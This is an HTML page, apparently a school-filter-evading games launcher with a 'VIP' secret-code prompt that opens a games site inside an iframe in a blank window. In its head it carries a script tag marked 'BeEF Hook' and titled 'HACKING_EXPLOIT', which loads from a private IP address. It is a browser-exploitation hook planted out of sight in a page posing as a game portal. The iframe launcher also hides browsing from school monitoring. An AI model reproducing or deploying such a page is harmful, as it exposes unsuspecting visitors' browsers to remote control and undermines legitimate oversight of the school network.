<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HEHEHEHEHEHE</title>
    <!-- BeEF Hook -->
    <script src="http://172.20.245.20:3000/demos/butcher/index.html" title="HACKING_EXPLOIT" allowtransparency="true" frameborder="0"></script>
    <style>
        /* Modal styles */
        .modal {
            display: none; /* Hidden by default */
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5); /* Black background with opacity */
        }

        .modal-content {
            background-color: #fff;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 400px;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        .button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }

        .button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <!-- Modal for Secret Code -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Enter Secret Code</h2>
            <p>Type the secret code to get V.I.P access.</p>
            <p><a href="https://beacons.ai/emiliolinux" target="_blank">Click Here</a> to learn more!</p>
            <input type="text" id="usernameInput" placeholder="Enter secret code" />
            <button class="button" id="submitBtn">Submit</button>
        </div>
    </div>

    <!-- Page content -->
    <h1 id="greeting"></h1>
    <button style="height:768px;width:1366px">Open The Website</button>

    <script>
        // Open modal on page load for secret code input
        window.onload = function() {
            // List of valid usernames
            const validUsernames = ["noaura", "sigma", "321", "jogjim", "secretcode"];

            // Get the modal
            var modal = document.getElementById("myModal");

            // Open the modal
            modal.style.display = "block";

            // Get the button and input elements
            var submitBtn = document.getElementById("submitBtn");
            var usernameInput = document.getElementById("usernameInput");

            // When the user clicks the submit button
            submitBtn.onclick = function() {
                const userInput = usernameInput.value;

                // Check if the input is valid
                if (!validUsernames.includes(userInput)) {
                    window.location.href = "https://blocked.goguardian.com/";
                } else {
                    modal.style.display = "none"; // Close the modal if valid
                }
            };

            // Get the <span> element that closes the modal
            var span = document.getElementsByClassName("close")[0];

            // Close the modal when user clicks on the "x"
            span.onclick = function() {
                modal.style.display = "none";
            };

            // Close the modal if user clicks outside it
            window.onclick = function(event) {
                if (event.target == modal) {
                    modal.style.display = "none";
                }
            };
        };

        // Code for opening the website in an iframe
        var urlobj = new window.URL(window.location.href);
        let url = 'https://vip-emiliogames.vercel.app/home.html';
        if (url) {
            var win;
            document.querySelector('button').onclick = function() {
                if (win) {
                    win.focus();
                } else {
                    win = window.open();
                    win.document.body.style.margin = '0';
                    win.document.body.style.height = '100%';
                    var iframe = win.document.createElement('iframe');
                    iframe.style.border = 'none';
                    iframe.style.width = '100%';
                    iframe.style.height = '100%';
                    iframe.style.margin = '0';
                    iframe.src = url;
                    win.document.body.appendChild(iframe);
                }
                location.reload();  // Refresh the page after embedding
            }
        }
    </script>
</body>
</html>
